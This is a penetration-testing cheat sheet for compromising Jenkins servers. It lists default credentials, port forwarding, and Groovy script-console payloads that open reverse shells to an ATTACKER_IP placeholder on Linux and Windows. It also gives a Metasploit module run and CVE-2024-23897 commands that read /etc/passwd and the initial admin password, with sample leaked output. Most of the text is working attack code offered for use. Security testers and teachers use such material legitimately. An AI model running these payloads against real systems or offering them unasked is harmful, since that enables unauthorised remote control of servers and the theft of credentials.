# Jenkins

## Discovery

- Default port: 8080
- Also uses port 5000 for slave servers
- Runs on Tomcat
- Often runs as SYSTEM (Windows) or root (Linux)

If Jenkins is only listening on localhost after getting a shell or SSH access, forward it:

```bash
ssh USER@TARGET -L 9999:127.0.0.1:8080
```

Then browse to:

```text
http://127.0.0.1:9999/login?from=%2F
```

Jenkins setup pages may reference the initial admin password path:

```text
/root/.jenkins/secrets/initialAdminPassword
```

## Default Credentials

```
admin:admin
admin:password
jenkins:jenkins
```

---

## Script Console RCE (Authenticated)

Path: `Manage Jenkins → Script Console` or `/script`

### Linux Reverse Shell (Groovy)

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Linux - Alternative

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

### Windows Command Execution

```groovy
def cmd = "cmd.exe /c whoami".execute();
println("${cmd.text}");
```

### Windows Reverse Shell (Groovy)

```groovy
String host="ATTACKER_IP";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## Metasploit

```bash
# Script console RCE
use exploit/multi/http/jenkins_script_console
set RHOSTS TARGET
set USERNAME admin
set PASSWORD admin
set TARGETURI /
run
```

---

## CVEs

| CVE | Description |
|-----|-------------|
| CVE-2018-1999002 + CVE-2019-1003000 | Pre-auth RCE (v2.137) |
| CVE-2019-1003000 | Sandbox bypass |

### CVE-2024-23897 - CLI Arbitrary File Read

Jenkins `2.401.2` can be vulnerable to arbitrary file read through the CLI parser. If `denyAnonymousReadAccess` is false or the target otherwise permits CLI access, use CVE-2024-23897 to read files through the local forwarded port.

Read a simple file first:

```bash
python3 CVE-2024-23897.py -t 127.0.0.1 -p 9999 -f '/etc/passwd'
```

The output may be embedded in CLI error text:

```text
ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
java -jar jenkins-cli.jar help
[COMMAND]
COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)
```

Read the initial administrator password:

```bash
python3 CVE-2024-23897.py -t 127.0.0.1 -p 9999 -f '/root/.jenkins/secrets/initialAdminPassword'
```

Successful leak:

```text
140ef31373034d19a77baa9c6b84a200
```

Reference:

- https://nvd.nist.gov/vuln/detail/CVE-2024-23897
